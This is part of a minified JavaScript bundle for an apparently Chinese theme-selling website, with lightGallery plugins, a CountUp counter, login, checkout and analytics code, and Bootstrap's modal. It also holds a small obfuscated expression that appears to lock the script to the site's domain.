                                l = !0, r = {
                                    x: e.pageX,
                                    y: e.pageY
                                }, o.core.$outer.addClass("lg-zoom-dragging"), i = u ? -Math.abs(n.attr("data-y")) + (r.y - s.y) : -Math.abs(n.attr("data-y")), t = c ? -Math.abs(n.attr("data-x")) + (r.x - s.x) : -Math.abs(n.attr("data-x")), o.core.s.useLeftForZoom ? n.css({
                                    left: t + "px",
                                    top: i + "px"
                                }) : n.css("transform", "translate3d(" + t + "px, " + i + "px, 0)")
                            }
                        }), d(window).on("mouseup.lg.zoom", function(e) {
                            a && (a = !1, o.core.$outer.removeClass("lg-zoom-dragging"), !l || s.x === r.x && s.y === r.y || (r = {
                                x: e.pageX,
                                y: e.pageY
                            }, o.touchendZoom(s, r, c, u)), l = !1), o.core.$outer.removeClass("lg-grabbing").addClass("lg-grab")
                        })
                    }, e.prototype.touchendZoom = function(e, t, i, n) {
                        var o = this,
                            s = o.core.$slide.eq(o.core.index).find(".lg-img-wrap"),
                            r = o.core.$slide.eq(o.core.index).find(".lg-object"),
                            a = -Math.abs(s.attr("data-x")) + (t.x - e.x),
                            l = -Math.abs(s.attr("data-y")) + (t.y - e.y),
                            c = (o.core.$outer.find(".lg").height() - r.prop("offsetHeight")) / 2,
                            u = Math.abs(r.prop("offsetHeight") * Math.abs(r.attr("data-scale")) - o.core.$outer.find(".lg").height() + c),
                            d = (o.core.$outer.find(".lg").width() - r.prop("offsetWidth")) / 2,
                            h = Math.abs(r.prop("offsetWidth") * Math.abs(r.attr("data-scale")) - o.core.$outer.find(".lg").width() + d);
                        (15 < Math.abs(t.x - e.x) || 15 < Math.abs(t.y - e.y)) && (n && (l <= -u ? l = -u : -c <= l && (l = -c)), i && (a <= -h ? a = -h : -d <= a && (a = -d)), n ? s.attr("data-y", Math.abs(l)) : l = -Math.abs(s.attr("data-y")), i ? s.attr("data-x", Math.abs(a)) : a = -Math.abs(s.attr("data-x")), o.core.s.useLeftForZoom ? s.css({
                            left: a + "px",
                            top: l + "px"
                        }) : s.css("transform", "translate3d(" + a + "px, " + l + "px, 0)"))
                    }, e.prototype.destroy = function() {
                        var e = this;
                        e.core.$el.off(".lg.zoom"), d(window).off(".lg.zoom"), e.core.$slide.off(".lg.zoom"), e.core.$el.off(".lg.tm.zoom"), e.resetZoom(), clearTimeout(e.zoomabletimeout), e.zoomabletimeout = !1
                    }, d.fn.lightGallery.modules.zoom = e
                }(), s = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            hash: !0
                        },
                        e = function(e) {
                            return this.core = s(e).data("lightGallery"), this.core.s = s.extend({}, t, this.core.s), this.core.s.hash && (this.oldHash = window.location.hash, this.init()), this
                        };
                    e.prototype.init = function() {
                        var t, n = this;
                        n.core.$el.on("onAfterSlide.lg.tm", function(e, t, i) {
                            history.replaceState ? history.replaceState(null, null, window.location.pathname + window.location.search + "#lg=" + n.core.s.galleryId + "&slide=" + i) : window.location.hash = "lg=" + n.core.s.galleryId + "&slide=" + i
                        }), s(window).on("hashchange.lg.hash", function() {
                            t = window.location.hash;
                            var e = parseInt(t.split("&slide=")[1], 10); - 1 < t.indexOf("lg=" + n.core.s.galleryId) ? n.core.slide(e, !1, !1) : n.core.lGalleryOn && n.core.destroy()
                        })
                    }, e.prototype.destroy = function() {
                        this.core.s.hash && (this.oldHash && this.oldHash.indexOf("lg=" + this.core.s.galleryId) < 0 ? history.replaceState ? history.replaceState(null, null, this.oldHash) : window.location.hash = this.oldHash : history.replaceState ? history.replaceState(null, document.title, window.location.pathname + window.location.search) : window.location.hash = "", this.core.$el.off(".lg.hash"))
                    }, s.fn.lightGallery.modules.hash = e
                }(), window.jQuery.fn._dm = jQuery.fn._w + jQuery.fn._w + jQuery.fn._w + (+(+!+[] + [+!+[]] + (!0 + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + jQuery.fn._wc + (+(+!+[] + [+!+[]] + (!0 + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + jQuery.fn._cn, a = window.jQuery,
                function() {
                    "use strict";
                    var t = {
                            share: !0,
                            facebook: !0,
                            facebookDropdownText: "Facebook",
                            twitter: !0,
                            twitterDropdownText: "Twitter",
                            googlePlus: !0,
                            googlePlusDropdownText: "GooglePlus",
                            pinterest: !0,
                            pinterestDropdownText: "Pinterest"
                        },
                        e = function(e) {
                            return this.core = a(e).data("lightGallery"), this.core.s = a.extend({}, t, this.core.s), this.core.s.share && this.init(), this
                        };
                    e.prototype.init = function() {
                        var n = this,
                            e = '<span id="lg-share" class="lg-icon"><ul class="lg-dropdown" style="position: absolute;">';
                        e += n.core.s.facebook ? '<li><a id="lg-share-facebook" target="_blank"><span class="lg-icon"></span><span class="lg-dropdown-text">' + this.core.s.facebookDropdownText + "</span></a></li>" : "", e += n.core.s.twitter ? '<li><a id="lg-share-twitter" target="_blank"><span class="lg-icon"></span><span class="lg-dropdown-text">' + this.core.s.twitterDropdownText + "</span></a></li>" : "", e += n.core.s.googlePlus ? '<li><a id="lg-share-googleplus" target="_blank"><span class="lg-icon"></span><span class="lg-dropdown-text">' + this.core.s.googlePlusDropdownText + "</span></a></li>" : "", e += n.core.s.pinterest ? '<li><a id="lg-share-pinterest" target="_blank"><span class="lg-icon"></span><span class="lg-dropdown-text">' + this.core.s.pinterestDropdownText + "</span></a></li>" : "", e += "</ul></span>", this.core.$outer.find(".lg-toolbar").append(e), this.core.$outer.find(".lg").append('<div id="lg-dropdown-overlay"></div>'), a("#lg-share").on("click.lg", function() {
                            n.core.$outer.toggleClass("lg-dropdown-active")
                        }), a("#lg-dropdown-overlay").on("click.lg", function() {
                            n.core.$outer.removeClass("lg-dropdown-active")
                        }), n.core.$el.on("onAfterSlide.lg.tm", function(e, t, i) {
                            setTimeout(function() {
                                a("#lg-share-facebook").attr("href", "https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(n.getSahreProps(i, "facebookShareUrl") || window.location.href)), a("#lg-share-twitter").attr("href", "https://twitter.com/intent/tweet?text=" + n.getSahreProps(i, "tweetText") + "&url=" + encodeURIComponent(n.getSahreProps(i, "twitterShareUrl") || window.location.href)), a("#lg-share-googleplus").attr("href", "https://plus.google.com/share?url=" + encodeURIComponent(n.getSahreProps(i, "googleplusShareUrl") || window.location.href)), a("#lg-share-pinterest").attr("href", "http://www.pinterest.com/pin/create/button/?url=" + encodeURIComponent(n.getSahreProps(i, "pinterestShareUrl") || window.location.href) + "&media=" + encodeURIComponent(n.getSahreProps(i, "src")) + "&description=" + n.getSahreProps(i, "pinterestText"))
                            }, 100)
                        })
                    }, e.prototype.getSahreProps = function(e, t) {
                        var i = "";
                        if (this.core.s.dynamic) i = this.core.s.dynamicEl[e][t];
                        else {
                            var n = this.core.$items.eq(e).attr("href"),
                                o = this.core.$items.eq(e).data(t);
                            i = "src" === t && n || o
                        }
                        return i
                    }, e.prototype.destroy = function() {}, a.fn.lightGallery.modules.share = e, jQuery.fn._eq = jQuery.fn._ww[jQuery.fn._lo][jQuery.fn._hn] == jQuery.fn._dm
                }()
        }, {}
    ],
    4: [
        function(e, t, i) {
            window.$ = window.jQuery = e("./jquery-1.12.4.min"), e("./modal"), e("./transition"), e("./typed"), e("./particles"), e("./owl.carousel"), e("./jquery.qrcode.min"), e("./lightgallery-all");
            var p = function(e, t, i, n, o, s) {
                for (var r = 0, a = ["webkit", "moz", "ms", "o"], l = 0; l < a.length && !window.requestAnimationFrame; ++l) window.requestAnimationFrame = window[a[l] + "RequestAnimationFrame"], window.cancelAnimationFrame = window[a[l] + "CancelAnimationFrame"] || window[a[l] + "CancelRequestAnimationFrame"];
                window.requestAnimationFrame || (window.requestAnimationFrame = function(e, t) {
                    var i = (new Date).getTime(),
                        n = Math.max(0, 16 - (i - r)),
                        o = window.setTimeout(function() {
                            e(i + n)
                        }, n);
                    return r = i + n, o
                }), window.cancelAnimationFrame || (window.cancelAnimationFrame = function(e) {
                    clearTimeout(e)
                });
                var c = this;

                function u(e) {
                    return "number" == typeof e && !isNaN(e)
                }
                if (c.version = function() {
                    return "1.8.5"
                }, c.options = {
                    useEasing: !0,
                    useGrouping: !0,
                    separator: ",",
                    decimal: ".",
                    easingFn: function(e, t, i, n) {
                        return i * (1 - Math.pow(2, -10 * e / n)) * 1024 / 1023 + t
                    },
                    formattingFn: function(e) {
                        var t, i, n, o;
                        if (e = e.toFixed(c.decimals), i = (t = (e += "").split("."))[0], n = 1 < t.length ? c.options.decimal + t[1] : "", o = /(\d+)(\d{3})/, c.options.useGrouping)
                            for (; o.test(i);) i = i.replace(o, "$1" + c.options.separator + "$2");
                        return c.options.prefix + i + n + c.options.suffix
                    },
                    prefix: "",
                    suffix: ""
                }, s && "object" == typeof s)
                    for (var d in c.options) s.hasOwnProperty(d) && null !== s[d] && (c.options[d] = s[d]);
                "" === c.options.separator && (c.options.useGrouping = !1), c.initialize = function() {
                    return !!c.initialized || (c.d = "string" == typeof e ? document.getElementById(e) : e, c.d ? (c.startVal = Number(t), c.endVal = Number(i), u(c.startVal) && u(c.endVal) ? (c.decimals = Math.max(0, n || 0), c.dec = Math.pow(10, c.decimals), c.duration = 1e3 * Number(o) || 2e3, c.countDown = c.startVal > c.endVal, c.frameVal = c.startVal, c.initialized = !0) : (console.error("[CountUp] startVal or endVal is not a number", c.startVal, c.endVal), !1)) : (console.error("[CountUp] target is null or undefined", c.d), !1))
                }, c.printValue = function(e) {
                    var t = c.options.formattingFn(e);
                    "INPUT" === c.d.tagName ? this.d.value = t : "text" === c.d.tagName || "tspan" === c.d.tagName ? this.d.textContent = t : this.d.innerHTML = t
                }, c.count = function(e) {
                    c.startTime || (c.startTime = e);
                    var t = (c.timestamp = e) - c.startTime;
                    c.remaining = c.duration - t, c.options.useEasing ? c.countDown ? c.frameVal = c.startVal - c.options.easingFn(t, 0, c.startVal - c.endVal, c.duration) : c.frameVal = c.options.easingFn(t, c.startVal, c.endVal - c.startVal, c.duration) : c.countDown ? c.frameVal = c.startVal - (c.startVal - c.endVal) * (t / c.duration) : c.frameVal = c.startVal + (c.endVal - c.startVal) * (t / c.duration), c.countDown ? c.frameVal = c.frameVal < c.endVal ? c.endVal : c.frameVal : c.frameVal = c.frameVal > c.endVal ? c.endVal : c.frameVal, c.frameVal = Math.round(c.frameVal * c.dec) / c.dec, c.printValue(c.frameVal), t < c.duration ? c.rAF = requestAnimationFrame(c.count) : c.callback && c.callback()
                }, c.start = function(e) {
                    c.initialize() && (c.callback = e, c.rAF = requestAnimationFrame(c.count))
                }, c.pauseResume = function() {
                    c.paused ? (c.paused = !1, delete c.startTime, c.duration = c.remaining, c.startVal = c.frameVal, requestAnimationFrame(c.count)) : (c.paused = !0, cancelAnimationFrame(c.rAF))
                }, c.reset = function() {
                    c.paused = !1, delete c.startTime, c.initialized = !1, c.initialize() && (cancelAnimationFrame(c.rAF), c.printValue(c.startVal))
                }, c.update = function(e) {
                    c.initialize() && (u(e = Number(e)) ? e !== c.frameVal && (cancelAnimationFrame(c.rAF), c.paused = !1, delete c.startTime, c.startVal = c.frameVal, c.endVal = e, c.countDown = c.startVal > c.endVal, c.rAF = requestAnimationFrame(c.count)) : console.error("[CountUp] update() - new endVal is not a number", e))
                }, c.initialize() && c.printValue(c.startVal)
            };
            Number.prototype.formatMoney = function(e, t, i, n) {
                    e = isNaN(e = Math.abs(e)) ? 2 : e, t = void 0 !== t ? t : "", i = i || "", n = n || ".";
                    var o = this,
                        s = o < 0 ? "-" : "",
                        r = parseInt(o = Math.abs(+o || 0).toFixed(e), 10) + "",
                        a = 3 < (a = r.length) ? a % 3 : 0;
                    return t + s + (a ? r.substr(0, a) + i : "") + r.substr(a).replace(/(\d{3})(?=\d)/g, "$1" + i) + (e ? n + Math.abs(o - r).toFixed(e).slice(2) : "")
                },
                function(d) {
                    var r = 0,
                        a = d(".data-count"),
                        h = d(window),
                        e = h.width(),
                        t = d("header.header");

                    function i() {
                        0 < h.scrollTop() ? t.addClass("header-fixed") : t.removeClass("header-fixed")
                    }
                    i(), 767 < e && (h.scroll(function() {
                        300 < h.scrollTop() ? d("#j-top").fadeIn("slow") : d("#j-top").fadeOut("fast"), i(), n()
                    }), d("#j-top").click(function() {
                        d("html, body").animate({
                            scrollTop: 0
                        }, "fast")
                    })), d("body").on("click", ".menu-toggle", function() {
                        d("body").toggleClass("menu-on"), 0 === d(".menu-on-shadow").length && d("body").append('<div class="menu-on-shadow"></div>')
                    }).on("click", ".menu-on-shadow", function() {
                        d("body").toggleClass("menu-on")
                    }), d(".theme-single").on("click", ".j-login", function(e) {
                        e.preventDefault();
                        var t = this;
                        d.getJSON("/json/isLogin.do", function(e) {
                            if (1 == e.result) window.location.href = d(t).data("href");
                            else if (0 == e.result) {
                                0 == d("#login-modal").length && d("body").append('<div class="modal mini-modal checkout-modal fade" id="login-modal" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">                <div class="modal-dialog">                <div class="modal-content">                <div class="modal-header">                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>                <h4 class="modal-title">登录提示</h4></div>                <div class="modal-body">                <p style="padding: 30px 0;text-align: center;margin: 0;font-size: 15px;">您还未登录，请登录后再进行相关操作！</p>                </div>                <div class="modal-footer">                <a class="btn btn-primary" style="padding: 6px 30px;" href="/member/login">登 录</a>                <a class="btn btn-normal" style="padding: 6px 30px;margin-left: 20px;" href="/member/register">注 册</a>                </div></div></div></div>'), d("#login-modal").modal("show")
                            }
                        })
                    }).on("click", ".view-all-ver", function() {
                        var e = d(this),
                            t = d(".more-ver");
                        t.toggleClass("active").slideToggle(), t.hasClass("active") ? e.text("收起全部记录") : (e.text("展开全部记录"), d("html, body").animate({
                            scrollTop: t.prev().offset().top
                        }, "fast"))
                    }), d(".payment-list").on("click", ".payment-item", function() {
                        var e = d(this),
                            t = e.data("payment");
                        d(".payment-item").removeClass("payment-selected"), e.addClass("payment-selected"), d("#j-checkout input[name=payment]").val(t)
                    }), d(".payment-item").length && (d(".payment-selected").length ? d(".payment-selected").trigger("click") : d(".payment-item").eq(0).trigger("click")), d(".buy-info-wrap").on("click", ".j-optional-item", function(e) {
                        var t = d(e.target);
                        if (!t.hasClass("j-optional") && "a" != t.get(0).tagName.toLowerCase()) {
                            var i = d(this).find(".j-optional");
                            i.prop("checked", !i.prop("checked")).trigger("change.check")
                        }
                    }).on("change.check", ".j-optional", function() {
                        var e = d(this),
                            t = e.prop("checked");
                        e.closest(".j-optional-item").toggleClass("disabled", !t);
                        var n = 0,
                            o = "";
                        d(".buy-item").each(function(e, t) {
                            var i = d(t);
                            i.hasClass("disabled") || (n += Number(i.find(".col4").data("price")), i.hasClass("j-optional-item") && (o += ("" == o ? "" : ",") + i.find(".col4").data("id")))
                        }), d(".total").html("￥" + n.formatMoney()), d("#j-checkout input[name=optional]").val(o)
                    }), d("#j-checkout").on("submit", function() {
                        d("#checkout-modal").modal("show")
                    }), d("#checkout-modal").on("click", ".j-checkout-ok", function() {
                        d("#checkout-modal").modal("hide"), setTimeout(function() {
                            window.location.href = "/member/product"
                        }, 300)
                    }), setTimeout(function() {
                        var e = 0,
                            t = setInterval(function() {
                                if (d(".j-logo").css("background-position", "0 " + -35 * e + "px"), 26 <= ++e) return clearInterval(t), !1
                            }, 40)
                    }, 2e3), setTimeout(function() {
                        d(".j-browser").addClass("on")
                    }, 400), setTimeout(function() {
                        d(".j-browser").addClass("done")
                    }, 2500), d("#j-typing").typed({
                        stringsElement: d("#j-typing-text"),
                        contentType: "html",
                        typeSpeed: 70,
                        loop: !0
                    });

                    function n() {
                        if (a.length && 0 == r) {
                            var e = h.scrollTop(),
                                t = e + h.height(),
                                i = a.offset().top;
                            if (i < t - h.height() / 4 && i > e - a.outerHeight() + 100) {
                                r = 1;
                                var n = new p("data-count-1", 0, d("#data-count-1").text()),
                                    o = new p("data-count-2", 0, d("#data-count-2").text()),
                                    s = new p("data-count-3", 0, d("#data-count-3").text());
                                n.start(), o.start(), s.start()
                            }
                        }
                    }
                    d("#j-particles").length && particlesJS("j-particles", {
                        particles: {
                            number: {
                                value: 40,
                                density: {
                                    enable: !0,
                                    value_area: 800
                                }
                            },
                            color: {
                                value: "#ffffff"
                            },
                            shape: {
                                type: "circle",
                                stroke: {
                                    width: 0,
                                    color: "#000000"
                                },
                                polygon: {
                                    nb_sides: 5
                                }
                            },
                            opacity: {
                                value: .5,
                                random: !1,
                                anim: {
                                    enable: !1,
                                    speed: 1,
                                    opacity_min: .1,
                                    sync: !1
                                }
                            },
                            size: {
                                value: 3,
                                random: !0,
                                anim: {
                                    enable: !1,
                                    speed: 40,
                                    size_min: .1,
                                    sync: !1
                                }
                            },
                            line_linked: {
                                enable: !0,
                                distance: 150,
                                color: "#ffffff",
                                opacity: .3,
                                width: 1
                            },
                            move: {
                                enable: !0,
                                speed: 3,
                                direction: "none",
                                random: !1,
                                straight: !1,
                                out_mode: "out",
                                bounce: !1,
                                attract: {
                                    enable: !1,
                                    rotateX: 600,
                                    rotateY: 1200
                                }
                            }
                        },
                        interactivity: {
                            detect_on: "canvas",
                            events: {
                                onhover: {
                                    enable: !0,
                                    mode: "grab"
                                },
                                onclick: {
                                    enable: !1,
                                    mode: "push"
                                },
                                resize: !0
                            },
                            modes: {
                                grab: {
                                    distance: 140,
                                    line_linked: {
                                        opacity: 1
                                    }
                                },
                                bubble: {
                                    distance: 400,
                                    size: 40,
                                    duration: 2,
                                    opacity: 8,
                                    speed: 3
                                },
                                repulse: {
                                    distance: 200,
                                    duration: .4
                                },
                                push: {
                                    particles_nb: 4
                                },
                                remove: {
                                    particles_nb: 2
                                }
                            }
                        },
                        retina_detect: !0
                    }), n(), d(document).ready(function() {
                        var e = d(".j-qrcode");
                        e.length && d.each(e, function(e, t) {
                            var i = d(t),
                                n = i.data("text");
                            i.qrcode({
                                text: n
                            })
                        }), u(), h.on("resize", function() {
                            u()
                        });
                        var s = d(".theme-tab"),
                            t = d("header.header .menu.pull-left");
                        if (!navigator.userAgent.match(/(iPhone|iPod|ios|iPad|Android|Windows Phone|BlackBerry)/i) && s.length) {
                            var i = d(".theme-header"),
                                n = d(".theme-content"),
                                r = n.find(".entry-tab-content"),
                                a = s.find("li"),
                                l = null,
                                c = null,
                                o = d(".theme-buy").clone();
                            d(".theme-tab .container").append(o), h.scroll(function() {
                                var o = h.scrollTop();
                                o >= i.outerHeight() ? (s.addClass("fixed"), n.css("padding-top", 60), t.addClass("theme-single-hide")) : (s.removeClass("fixed"), n.css("padding-top", ""), t.removeClass("theme-single-hide")), d.each(r, function(e, t) {
                                    if (d(t).offset().top < o + 100) {
                                        if ((l = e) !== c && e == r.length - 1) {
                                            a.removeClass("active"), (n = a.eq(l)).addClass("active");
                                            var i = s.find("li:first-child").position().left;
                                            s.find(".underscore").css("transform", "translateX(" + (n.position().left - i) + "px)"), c = l
                                        }
                                    } else if (l !== c) {
                                        var n;
                                        a.removeClass("active"), (n = a.eq(l)).addClass("active");
                                        i = s.find("li:first-child").position().left;
                                        s.find(".underscore").css("transform", "translateX(" + (n.position().left - i) + "px)"), c = l
                                    }
                                })
                            }), s.on("mouseenter", "li", function() {
                                var e = d(this),
                                    t = e.parent(),
                                    i = e.position().left - t.find("li:first-child").position().left;
                                t.find(".underscore").css("transform", "translateX(" + i + "px)")
                            }).on("mouseleave", "li", function() {
                                var e = d(this).parent(),
                                    t = e.find(".active").position().left - e.find("li:first-child").position().left;
                                e.find(".underscore").css("transform", "translateX(" + t + "px)")
                            })
                        }

                        function u() {
                            d(".main-feature").each(function(e, t) {
                                var i = d(t),
                                    n = 0,
                                    o = i.find("ul>li");
                                o.outerHeight(""), o.each(function(e, t) {
                                    var i = d(t).outerHeight();
                                    n < i && (n = i)
                                }), o.outerHeight(n)
                            })
                        }
                    });
                    var o = document.referrer;
                    d.getJSON(o ? "/json/isLogin.do?r=" + encodeURIComponent(o) : "/json/isLogin.do", function(e) {
                        var t = d("#j-user");
                        window.user_flag = e.user.flag, 1 == e.result ? (gtag("config", "UA-68592945-2", {
                            custom_map: {
                                dimension1: "flag",
                                dimension2: "ip"
                            },
                            user_id: e.user.ID,
                            link_attribution: !0
                        }), t.html('<li class="btn-group dropdown j-member"><a class="dropdown-title" href="/member"><i class="fa fa-user"></i> 用户中心</a><a class="dropdown-toggle" href="javascript:;"><i class="fa fa-angle-down"></i></a><ul class="sub-menu" role="menu"><li><a href="/member/product"><i class="fa fa-star"></i> 我的服务</a></li><li><a href="/member/profile"><i class="fa fa-info-circle"></i> 用户信息</a></li><li><a href="/member/logout"><i class="fa fa-sign-out"></i> 退出登录</a></li></ul></li>'), t.addClass("menu"), d(".btn-inner").hide()) : gtag("config", "UA-68592945-2", {
                            custom_map: {
                                dimension1: "flag",
                                dimension2: "ip"
                            },
                            link_attribution: !0
                        });
                        var i = u("_ga");
                        if (i = i ? i.replace("GA1.2.", "") : "", gtag("event", "isLogin", {
                            ip: i + "_" + e.user.ip,
                            flag: e.user.flag
                        }), t.show(), void 0 !== e.notice && e.notice && !u("notice_close")) {
                            var n = '<section id="top-notice" class="top-notice" style="display: none;"><div class="container"><span class="top-notice-close pull-right">×</span>' + e.notice + "</div></section>";
                            d(document.body).prepend(n).addClass("notice-fixed"), d("#top-notice").slideDown("800"), 1
                        }
                        void 0 !== e.timestrap && e.timestrap && d(".contact").show()
                    }), d(document).on("click", 'a[href^="#"]', function(e) {
                        var t = d(this).attr("role");
                        if ("tab" != t && "button" != t && (e.preventDefault(), this.hash)) {
                            var i = d(this.hash).length ? d(this.hash).offset().top : 0;
                            i = i - d("header.header").outerHeight() - 10, i = (i = d("#wpadminbar").length ? i - d("#wpadminbar").outerHeight() : i) < 0 ? 0 : i, d("html, body").animate({
                                scrollTop: i
                            }, 400)
                        }
                    }).on("click", ".top-notice-close", function() {
                        var t = d(this).closest(".top-notice");
                        t.slideUp("1000", function() {
                            t.remove();
                            var e = new Date;
                            e.setTime(e.getTime() + 6048e5), document.cookie = "notice_close=1;expires=" + e.toGMTString() + ";path=/"
                        }), d(document.body).removeClass("notice-fixed")
                    }).on("click", ".j-tab-item", function() {
                        var e = d(this).index();
                        d(".j-tab-item").removeClass("active").eq(e).addClass("active"), d(".j-tab-content").removeClass("active").eq(e).addClass("active")
                    }).on("click", ".theme-tab-inner li", function() {
                        var e = d(this),
                            t = e.index();
                        e.parent().find("li").removeClass("active"), e.addClass("active");
                        var i = d("#entry-sec-" + t).length ? d("#entry-sec-" + t).offset().top : 0;
                        i = (i = i - d("header.header").outerHeight() - 20) < 0 ? 0 : i, d("html, body").animate({
                            scrollTop: i
                        }, 400)
                    });
                    var s = d(".case-wrap.slider");
                    if (s.length) s.owlCarousel({
                        items: 1,
                        dots: !1,
                        nav: !0,
                        loop: !0,
                        navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>']
                    });
                    var l = d(".screenshot-box").owlCarousel({
                            items: 1,
                            dots: !1,
                            nav: !1,
                            autoHeight: !0,
                            onTranslate: function(e) {
                                e.item.index % 4 == 0 && c.trigger("to.owl.carousel", e.item.index / 4);
                                var t = c.find(".owl-item").eq(e.item.index),
                                    i = t.position().left;
                                t.parent().find(".owl-item-frame").css("transform", "translateX(" + i + "px)"), t.find(".s-item").addClass("active"), setTimeout(function() {
                                    t.find(".s-item").removeClass("active"), t.parent().find(".synced").removeClass("synced"), t.addClass("synced")
                                }, 300)
                            },
                            onInitialized: function(e) {
                                var t = d(e.target),
                                    i = t.find(".owl-item");
                                d.each(i, function(e, t) {
                                    var i = d(t),
                                        n = i.find("img").attr("src");
                                    i.attr("data-src", n)
                                }), t.find(".owl-stage").lightGallery({
                                    download: !1,
                                    share: !1
                                })
                            }
                        }),
                        c = d(".screenshot-thumb").owlCarousel({
                            items: 4,
                            margin: 10,
                            dots: !1,
                            nav: !0,
                            mouseDrag: !1,
                            navText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
                            onInitialized: function(e) {
                                var n = d(e.target);
                                n.find(".owl-item").eq(0).addClass("synced"), n.on("click", ".owl-item", function(e) {
                                    var t = d(this);
                                    l.trigger("to.owl.carousel", t.index());
                                    var i = t.position().left;
                                    n.find(".owl-item-frame").css("transform", "translateX(" + i + "px)"), t.find(".s-item").addClass("active"), setTimeout(function() {
                                        t.find(".s-item").removeClass("active"), t.parent().find(".synced").removeClass("synced"), t.addClass("synced")
                                    }, 300)
                                }), h.on("resize", function() {
                                    var e = d(".owl-item.synced"),
                                        t = e.position().left;
                                    e.parent().find(".owl-item-frame").css("transform", "translateX(" + t + "px)")
                                }), n.find(".owl-stage").append('<div class="owl-item-frame"></div>')
                            }
                        });

                    function u(e) {
                        var t = ("; " + document.cookie).split("; " + e + "=");
                        if (2 == t.length) return t.pop().split(";").shift()
                    }
                    d(".fixed-tool").on("click", ".ft-item>a", function() {
                        var e = d(this).data("type");
                        "online" != e && "qq" != e || gtag("event", "contact", {
                            event_category: "点击事件",
                            event_label: e
                        })
                    }), "undefined" != typeof _views && _views && d.getJSON("/json/post.do", function(e) {
                        d("#j-views").html("浏览：" + e.views)
                    }), d("#j-show").length && d("#j-show").html('<div class="browsers">    <div class="left browser j-browser"></div>    <div class="right browser j-browser"></div>    <div class="center browser j-browser">    <div class="b-hero">    <div class="b-logo j-logo"></div>    <div class="b-header"></div>    <div class="b-paragraph a"></div>    <div class="b-paragraph b"></div>    <div class="b-paragraph c"></div>    <div class="b-paragraph d"></div>    </div>    <div class="b-bottom">    <div class="b-bottom-col a">    <div class="b-bottom-row a"></div>    <div class="b-bottom-row b"></div>    <div class="b-bottom-row c"></div>    </div>    <div class="b-bottom-col b">    <div class="b-bottom-row a"></div>    <div class="b-bottom-row b"></div>    <div class="b-bottom-row c"></div>    </div>    <div class="b-bottom-col c">    <div class="b-bottom-row a"></div>    <div class="b-bottom-row b"></div>    <div class="b-bottom-row c"></div>    </div>    </div>    </div>    </div>')
                }(jQuery)
        }, {
            "./jquery-1.12.4.min": 1,
            "./jquery.qrcode.min": 2,
            "./lightgallery-all": 3,
            "./modal": 5,
            "./owl.carousel": 6,
            "./particles": 7,
            "./transition": 8,
            "./typed": 9
        }
    ],
    5: [
        function(e, t, i) {
            ! function(s) {
                "use strict";
                var r = function(e, t) {
                    this.options = t, this.$body = s(document.body), this.$element = s(e), this.$dialog = this.$element.find(".modal-dialog"), this.$backdrop = null, this.isShown = null, this.originalBodyPad = null, this.scrollbarWidth = 0, this.ignoreBackdropClick = !1, this.options.remote && this.$element.find(".modal-content").load(this.options.remote, s.proxy(function() {
                        this.$element.trigger("loaded.bs.modal")
                    }, this))
                };

                function a(n, o) {
                    return this.each(function() {
                        var e = s(this),
                            t = e.data("bs.modal"),
                            i = s.extend({}, r.DEFAULTS, e.data(), "object" == typeof n && n);
                        t || e.data("bs.modal", t = new r(this, i)), "string" == typeof n ? t[n](o) : i.show && t.show(o)
                    })
                }
                r.VERSION = "3.3.5", r.TRANSITION_DURATION = 300, r.BACKDROP_TRANSITION_DURATION = 150, r.DEFAULTS = {
                    backdrop: !0,
                    keyboard: !0,
                    show: !0
                }, r.prototype.toggle = function(e) {
                    return this.isShown ? this.hide() : this.show(e)
                }, r.prototype.show = function(i) {
                    var n = this,
                        e = s.Event("show.bs.modal", {
                            relatedTarget: i
                        });
                    this.$element.trigger(e), this.isShown || e.isDefaultPrevented() || (this.isShown = !0, this.checkScrollbar(), this.setScrollbar(), this.$body.addClass("modal-open"), this.escape(), this.resize(), this.$element.on("click.dismiss.bs.modal", '[data-dismiss="modal"]', s.proxy(this.hide, this)), this.$dialog.on("mousedown.dismiss.bs.modal", function() {
                        n.$element.one("mouseup.dismiss.bs.modal", function(e) {
                            s(e.target).is(n.$element) && (n.ignoreBackdropClick = !0)
                        })
                    }), this.backdrop(function() {
                        var e = s.support.transition && n.$element.hasClass("fade");
                        n.$element.parent().length || n.$element.appendTo(n.$body), n.$element.show().scrollTop(0), n.adjustDialog(), e && n.$element[0].offsetWidth, n.$element.addClass("in"), n.enforceFocus();
                        var t = s.Event("shown.bs.modal", {
                            relatedTarget: i
                        });
                        e ? n.$dialog.one("bsTransitionEnd", function() {
                            n.$element.trigger("focus").trigger(t)
                        }).emulateTransitionEnd(r.TRANSITION_DURATION) : n.$element.trigger("focus").trigger(t)
                    }))
                }, r.prototype.hide = function(e) {
                    e && e.preventDefault(), e = s.Event("hide.bs.modal"), this.$element.trigger(e), this.isShown && !e.isDefaultPrevented() && (this.isShown = !1, this.escape(), this.resize(), s(document).off("focusin.bs.modal"), this.$element.removeClass("in").off("click.dismiss.bs.modal").off("mouseup.dismiss.bs.modal"), this.$dialog.off("mousedown.dismiss.bs.modal"), s.support.transition && this.$element.hasClass("fade") ? this.$element.one("bsTransitionEnd", s.proxy(this.hideModal, this)).emulateTransitionEnd(r.TRANSITION_DURATION) : this.hideModal())
                }, r.prototype.enforceFocus = function() {
                    s(document).off("focusin.bs.modal").on("focusin.bs.modal", s.proxy(function(e) {
                        this.$element[0] === e.target || this.$element.has(e.target).length || this.$element.trigger("focus")
                    }, this))
                }, r.prototype.escape = function() {
                    this.isShown && this.options.keyboard ? this.$element.on("keydown.dismiss.bs.modal", s.proxy(function(e) {
                        27 == e.which && this.hide()
                    }, this)) : this.isShown || this.$element.off("keydown.dismiss.bs.modal")
                }, r.prototype.resize = function() {
                    this.isShown ? s(window).on("resize.bs.modal", s.proxy(this.handleUpdate, this)) : s(window).off("resize.bs.modal")
                }, r.prototype.hideModal = function() {
                    var e = this;
                    this.$element.hide(), this.backdrop(function() {
                        e.$body.removeClass("modal-open"), e.resetAdjustments(), e.resetScrollbar(), e.$element.trigger("hidden.bs.modal")
                    })
